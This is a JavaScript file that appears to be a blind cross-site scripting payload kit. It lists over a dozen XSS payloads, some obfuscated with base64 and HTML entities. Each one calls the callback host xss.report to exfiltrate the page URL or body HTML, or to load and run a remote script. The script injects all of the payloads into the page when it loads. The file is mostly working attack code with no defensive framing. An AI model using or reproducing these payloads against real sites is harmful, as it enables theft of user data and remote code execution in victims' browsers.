(function () {
  // Set the URL of your server to receive the callbacks
  var callbackUrl = 'https://xss.report/s/xsshunter';

  // List of payloads to test
  var payloads = [
    '"><img src="https://xss.report/s/xsshunter" onerror=\'this.src="https://xss.report/s/xsshunter?" + btoa(document.location)\'>',
    '"><img src=x onerror=\'this.src="https://xss.report/s/xsshunter?" + btoa(document.location)\'>',
    '"><img src=x onerror=\'this.src="https://" + btoa(document.location) + ".xss.report/s/xsshunter?"\'>',
    '"><img src=x onerror=\'this.src="https://xss.report/s/xsshunter?" + btoa(document.location)\'>',
    '"><img src=x onerror=\'fetch("https://xss.report/s/xsshunter/image-xss-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})\'>',
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3hzc2h1bnRlciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>',
    'javascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'//xss.report/s/xsshunter\\\';document.body.appendChild(a)\')',
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3hzc2h1bnRlciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>',
    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3hzc2h1bnRlciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>',
    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/s/xsshunter&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
    'var a=document.createElement("script");a.src="//xss.report/s/xsshunter";document.body.appendChild(a);',
    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/s/xsshunter");a.send();</script>',
    '<script>$.getScript("//xss.report/s/xsshunter")</script>',
    '"><img src="https://xss.report/s/xsshunter">',
    // Add more payloads as needed
  ];

  // Function to send the payload to the server
  function sendPayload(payload) {
    var image = new Image();
    image.src = callbackUrl + '?payload=' + encodeURIComponent(payload);
  }

  // Function to check for Blind XSS using multiple payloads
  function checkBlindXSS() {
    for (var i = 0; i < payloads.length; i++) {
      // Trigger each payload
      document.body.innerHTML += payloads[i];
    }
  }

  // Call the function to check for Blind XSS when the page loads
  checkBlindXSS();
})();
